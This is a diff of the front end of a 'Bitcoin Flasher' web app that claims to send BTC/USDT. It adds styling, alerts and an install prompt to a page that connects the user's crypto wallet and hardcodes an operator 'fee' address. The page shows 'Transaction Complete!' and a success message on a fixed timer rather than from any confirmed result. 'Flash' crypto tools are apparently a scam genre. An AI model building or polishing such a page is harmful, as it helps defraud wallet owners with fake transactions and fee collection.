@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <!-- Essential Meta Tags -->
     <meta charset="UTF-8">
@@ -8,7 +9,7 @@
     <meta name="description" content="Experience secure and seamless BTC/USDT transactions with Bitcoin Flasher DApp.">
     <meta name="keywords" content="Bitcoin Flasher, Blockchain DApp, BTC Transactions, USDT Transfers, ERC20, BEP20, Polygon, PWA">
     <meta name="robots" content="index, follow">
-    <meta name="theme-color" content="#000000">
+    <meta name="theme-color" content="#ff9900">
 
     <!-- Canonical and Open Graph links -->
     <link rel="canonical" href="https://bitcoin-flasher.github.io/">
@@ -38,7 +39,7 @@
     <!-- Custom styling -->
     <style>
         body {
-            background-color: #101010;
+            background-color: #121212;
             color: #ffffff;
             font-family: 'Arial', sans-serif;
             margin: 0;
@@ -47,7 +48,7 @@
         }
 
         .container {
-            margin-top: 5%;
+            margin-top: 7%;
         }
 
         .card {
@@ -61,15 +62,28 @@
             background-color: #ff9900;
             border: none;
             font-size: 18px;
-            padding: 10px 20px;
+            padding: 12px 24px;
+            transition: background-color 0.3s ease;
         }
 
         .btn-primary:hover {
             background-color: #e67e00;
         }
 
-        input, button {
-            margin-top: 15px;
+        .btn-danger {
+            background-color: #dc3545;
+            border: none;
+            font-size: 18px;
+            padding: 12px 24px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+
+        .input-group {
+            margin-top: 20px;
         }
 
         footer {
@@ -82,8 +96,24 @@
         #progressBar {
             transition: width 0.5s;
         }
+
+        .alert {
+            display: none;
+        }
+
+        .wallet-connect-status {
+            font-size: 16px;
+            color: #ff9900;
+            margin-top: 10px;
+        }
+
+        .alert-message {
+            font-size: 16px;
+            color: #e67e00;
+        }
     </style>
 </head>
+
 <body>
     <div class="container text-center">
         <div class="card p-4">
@@ -92,10 +122,10 @@
 
             <!-- Wallet Connection -->
             <button id="connectWallet" class="btn btn-primary w-100">Connect Wallet</button>
-            <p id="walletStatus" class="text-success mt-3">Not Connected</p>
+            <p id="walletStatus" class="wallet-connect-status">Not Connected</p>
 
             <!-- Transaction Form -->
-            <form id="transactionForm">
+            <form id="transactionForm" style="display:none;">
                 <div class="mb-3">
                     <label for="recipient" class="form-label">Recipient Address</label>
                     <input type="text" id="recipient" class="form-control" placeholder="Enter recipient address" required>
@@ -107,10 +137,14 @@
                 <button type="submit" class="btn btn-primary w-100">Send Transaction</button>
             </form>
 
-            <!-- Progress -->
+            <!-- Transaction Progress -->
             <div class="progress mt-3">
                 <div id="progressBar" class="progress-bar bg-warning" style="width: 0%;">0%</div>
             </div>
+
+            <!-- Alerts -->
+            <div id="errorAlert" class="alert alert-danger alert-message">Error! Please try again.</div>
+            <div id="successAlert" class="alert alert-success alert-message">Transaction successful!</div>
         </div>
     </div>
 
@@ -124,6 +158,7 @@
         let web3, userAccount;
         const feeAddress = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";
 
+        // Connect Wallet
         async function connectWallet() {
             if (window.ethereum) {
                 try {
@@ -131,6 +166,8 @@
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                     userAccount = accounts[0];
                     document.getElementById('walletStatus').textContent = `Connected: ${userAccount}`;
+                    document.getElementById('transactionForm').style.display = 'block'; // Show transaction form
+                    document.getElementById('connectWallet').style.display = 'none'; // Hide connect button
                 } catch (error) {
                     alert('Wallet connection failed!');
                 }
@@ -139,6 +176,7 @@
             }
         }
 
+        // Send Transaction
         async function sendTransaction(event) {
             event.preventDefault();
             const recipient = document.getElementById('recipient').value;
@@ -154,10 +192,12 @@
                 setTimeout(() => {
                     document.getElementById('progressBar').style.width = '100%';
                     document.getElementById('progressBar').textContent = 'Transaction Complete!';
-                    alert('Transaction sent successfully.');
+                    document.getElementById('successAlert').style.display = 'block';
+                    setTimeout(() => document.getElementById('successAlert').style.display = 'none', 5000);
                 }, 2000);
             } catch (error) {
-                alert('Transaction failed: ' + error.message);
+                document.getElementById('errorAlert').style.display = 'block';
+                setTimeout(() => document.getElementById('errorAlert').style.display = 'none', 5000);
             }
         }
 
@@ -169,8 +209,12 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
-            alert('Install this app to your device for better accessibility.');
+            let installPrompt = confirm('Install Bitcoin Flasher as an app?');
+            if (installPrompt) {
+                deferredPrompt.prompt();
+            }
         });
     </script>
 </body>
+
 </html>
